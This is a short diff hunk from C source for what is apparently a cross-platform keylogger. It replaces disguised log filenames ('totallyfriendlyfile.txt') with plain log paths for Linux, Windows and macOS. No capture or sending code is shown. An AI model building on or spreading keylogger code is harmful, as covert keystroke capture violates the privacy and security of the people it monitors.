@@ -3,11 +3,11 @@
 
 // depending on the OS, we'll use a different path for the log file
 #ifdef __linux__
-    #define LOGFILE "./Linux/totallyfriendlyfile.txt"
+    #define LOGFILE "../log/unix.log"
 #elif defined _WIN32
-    #define LOGFILE "./Windows/totallyfriendlyfile.txt"
+    #define LOGFILE "../log/windows.log"
 #elif defined __MACH__
-    #define LOGFILE "./macOS/totallyfriendlyfile.txt"
+    #define LOGFILE "../log/macos.log"
 #endif
 
 // calling the right keylogger depending on the OS
